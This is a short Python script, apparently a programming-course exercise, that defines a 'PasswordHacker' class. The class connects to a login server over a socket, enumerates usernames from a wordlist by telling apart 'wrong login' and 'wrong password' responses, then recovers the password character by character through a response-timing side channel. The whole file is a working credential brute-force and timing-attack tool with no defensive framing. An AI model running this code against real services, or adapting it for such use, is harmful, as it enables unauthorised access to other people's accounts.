from socket import socket
import sys
import string
import json
from datetime import datetime
from datetime import timedelta


class PasswordHacker:
    def __init__(self, address: str, port: int):
        self.address = address
        self.port = port
        self.receive_buffer_size = 1024  # from example in bytes

    @classmethod
    def build_login_body(cls, username_request: str, password_request: str) -> bytes:
        json_string = '{"login": "' + username_request + '", "password": "' + password_request + '"}'
        return json_string.encode()

    def bruteforce_username_password(self) -> str:
        with socket() as client_socket:
            client_socket.connect((self.address, self.port))
            username = self.find_username(client_socket)
            password = self.find_password(client_socket, username)
        return '{"login": "' + username + '", "password": "' + password + '"}'

    def find_password(self, client_socket: socket(), username: str):
        """
        connects to socket sending found username if server takes
        significant time to process request a character has been found
        """
        maximum_time = timedelta(milliseconds=100)  # arbitrary set millis
        password = ''
        possible_characters = string.ascii_letters + string.digits
        for password_length in range(50):  # arbitrary maximum password length
            for possible_character in possible_characters:
                working_password = password + possible_character
                start = datetime.now()
                client_socket.send(self.build_login_body(username, working_password))
                result = json.loads(client_socket.recv(self.receive_buffer_size).decode())['result']
                finish = datetime.now()
                difference = finish - start
                if difference > maximum_time:
                    password = working_password
                    break
                elif result == 'Connection success!':
                    return working_password

    def find_username(self, client_socket: socket()) -> str:
        """
        attempts connect to server with empty password once
        body changes from wrong login to wrong password we have
        username! Not found is empty
        """
        for username in self.read_usernames():
            client_socket.send(self.build_login_body(username, ' '))
            response_string = client_socket.recv(self.receive_buffer_size).decode()
            result = json.loads(response_string)['result']
            if result == 'Wrong password!':
                return username

    @classmethod
    def read_usernames(cls) -> []:
        path = 'logins.txt'
        with open(path, 'r') as usernames:
            return [username.strip() for username in usernames.readlines()]


def main():
    ip_address = sys.argv[1]
    port = int(sys.argv[2])

    password_hacker = PasswordHacker(ip_address, port)
    print(password_hacker.bruteforce_username_password())


if __name__ == '__main__':
    main()
